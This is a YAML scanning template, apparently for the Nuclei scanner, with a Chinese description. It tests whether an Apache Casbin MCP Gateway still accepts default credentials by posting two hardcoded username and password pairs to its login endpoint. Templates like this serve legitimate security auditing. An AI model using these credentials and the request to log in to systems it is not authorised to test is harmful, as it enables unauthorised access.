id: apache-casbin-mcp-gateway-default-login

info:
  name: Apache Casbin MCP Gateway 默认口令登录（弱口令）
  author: icarot
  severity: high
  description: |
    该模板通过尝试 Apache Casbin MCP Gateway 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/apache/casbin-mcp-gateway
  metadata:
    max-request: 2
    vendor: apache
    product: casbin-mcp-gateway
  tags: apache,casbin-mcp-gateway,default-login

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - alice
        - bob
      password:
        - password123
        - password456

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"token":'
          - '"user":'
        condition: and

      - type: status
        status:
          - 200
